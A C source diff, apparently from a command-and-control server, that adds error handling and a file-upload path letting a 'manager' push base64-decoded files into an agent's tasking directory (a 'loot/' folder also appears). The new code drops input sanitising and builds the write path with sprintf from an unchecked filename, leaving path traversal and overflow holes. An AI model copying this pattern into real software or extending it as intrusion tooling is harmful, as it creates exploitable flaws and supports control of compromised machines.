@@ -368,22 +368,6 @@ void manager_handler(struct clientNode *node){
                             }
                             
                             rc = ssh_channel_write(manager->chan, tmp_ptr2, strlen(tmp_ptr2));
-                            /*do
-                            {
-                                memset(buff, 0, sizeof(buff));
-                                size_e = b64_encoded_size(sizeof(buff));
-                                
-                                
-                                
-                                if(rc == SSH_ERROR){
-                                    printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
-                                    return;
-                                }
-
-                                printf("Size: %d, Read: %d, Size_e: %d, \n", size, read, size_e);//ok
-                                
-                            } while (read < size);*/
-
                             fclose(file);
 
                             if (ctr >= count)
@@ -425,28 +409,73 @@ void manager_handler(struct clientNode *node){
 
         case MANAG_UP_FILE:
             printf("Manager upload caught\n");
-            /*ADD CHECKS IN HERE FOR SAFETY*/
-            
-            // gets file name
-            ssh_channel_write(manager->chan, "fn", 3);
-            ssh_channel_read(manager->chan, filename, sizeof(filename), 0);
-            
+            // Agent_id is stored in ptr
+            rc = ssh_channel_write(manager->chan, "ok", 3);
+            if(rc == SSH_ERROR){
+                printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                return;
+            }
+
+            memset(filename, 0, sizeof(filename));
+            rc = ssh_channel_read(manager->chan, filename, sizeof(filename), 0);
+            if(rc == SSH_ERROR){
+                printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                return;
+            }
+
             // get size and allocate memory segment
-            ssh_channel_write(manager->chan, "ok", 3);
-            ssh_channel_read(manager->chan, (char *) &size, 1, 0);
-            char *data_ptr = malloc(size);
-            memset(data_ptr, 0, size);
+            rc = ssh_channel_write(manager->chan, "ok", 3);
+            if(rc == SSH_ERROR){
+                printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                return;
+            }
+
+            memset(tmpbuffer, 0, sizeof(tmpbuffer));
+            rc = ssh_channel_read(manager->chan, tmpbuffer, sizeof(tmpbuffer), 0);
+            if(rc == SSH_ERROR){
+                printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                return;
+            }
+
+            size = atoi(tmpbuffer);
+            char *data_ptr = malloc(size+1);
+            memset(data_ptr, 0, size+1);
             
             // writes file size
-            ssh_channel_write(manager->chan, "ok", 3);
-            ssh_channel_read(manager->chan, buff, size, 0);
+            rc = ssh_channel_write(manager->chan, "ok", 3);
+            if(rc == SSH_ERROR){
+                printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                return;
+            }
+            rc = ssh_channel_read(manager->chan, data_ptr, size, 0);
+            if(rc == SSH_ERROR){
+                printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                return;
+            }
 
+            size_e = b64_decoded_size(data_ptr);
+
+            char *temp = malloc(size_e);
+            if(!b64_decode(data_ptr, (unsigned char*)temp, size_e)){
+                printf("Manager %s: failed to decode data\n", manager->id);
+                return;
+            }
+            
             // writes file 
-            ssh_channel_write(manager->chan, "ok", 3);
-            clean_input(filename);
-            strcat("loot/", filename);
-            file = fopen(filename, "wb");
-            fwrite(data_ptr, 1, size, file);
+            rc = ssh_channel_write(manager->chan, "ok", 3);
+            if(rc == SSH_ERROR){
+                printf("Manager %s: Caught channel error: %s\n", manager->id, ssh_get_error(ssh_channel_get_session(manager->chan)));
+                return;
+            }
+
+            memset(buff, 0, sizeof(buff));
+            sprintf(buff, "%s/agents/%s/tasking/%s", getcwd(name, sizeof(name)), ptr, filename);
+            file = fopen(buff, "wb");
+            if(file == NULL){
+                perror("");
+                return;
+            }
+            fwrite(temp, 1, size_e, file);
             fclose(file);
             break;
 
